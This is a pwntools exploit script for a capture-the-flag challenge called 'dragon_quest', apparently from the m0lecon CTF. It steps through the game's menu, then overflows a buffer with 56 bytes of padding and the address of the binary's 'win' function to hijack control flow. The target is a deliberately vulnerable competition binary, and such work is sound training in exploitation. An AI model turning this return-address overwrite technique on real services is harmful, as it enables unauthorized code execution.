#!/usr/bin/env python3

from pwn import *

exe = ELF('dragon_quest', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = [
    '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', 
    '0', 'split-pane','-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c'
]

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        b*0x401b57

        c
        ''')
        input()

if args.REMOTE:
    p = remote('dragonquest.challs.m0lecon.it', 5555)
elif args.DOCKER:
    p = remote('127.0.0.1')
else:
    p = process([exe.path])
GDB()

def learn(name, dmg):
    slna(b'> ', 1)
    sla(b'chars): ', name)
    slna(b'(1-1999): ', dmg)

def fight(idx):
    slna(b'index > ', idx)


learn(b's1', 1999)
learn(b's2', 1999)
learn(b's3', 1999)
learn(b's4', 333)
learn(b's5', 333)

slna(b'> ', 4)
fight(0)
fight(1)
fight(2)
fight(3)
fight(4)

payload = flat(
    cyclic(56),
    exe.sym.win + 8
)

sla(b'final taunt: ', payload)

p.interactive()
